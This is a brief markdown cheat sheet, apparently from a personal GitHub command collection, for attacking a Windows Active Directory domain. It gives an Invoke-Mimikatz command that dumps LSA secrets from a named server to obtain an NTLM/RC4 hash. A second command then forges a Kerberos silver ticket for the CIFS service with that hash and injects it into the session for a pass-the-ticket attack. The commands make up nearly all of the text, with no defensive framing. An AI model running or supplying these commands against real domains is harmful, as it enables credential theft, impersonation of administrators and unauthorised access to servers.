## 
- First Enumeratee !!
- Once everything is done


```
Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName prod.research.security.local (To get RC4(Hash Ntlm) 
```
- Then Forge silver ticket and directly perform pass the ticket attack
```
Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.security.local /target:prod.research.security.local /SID:domainSID /service:someservice(CIFS in this particular case) /rc4:hashdumpedintheformofrc4 /ptt"'
```



![image](https://github.com/Luminous-split/LifeLongCommands/assets/116489011/a1311993-81fe-47d6-a85d-257eab2762bb)
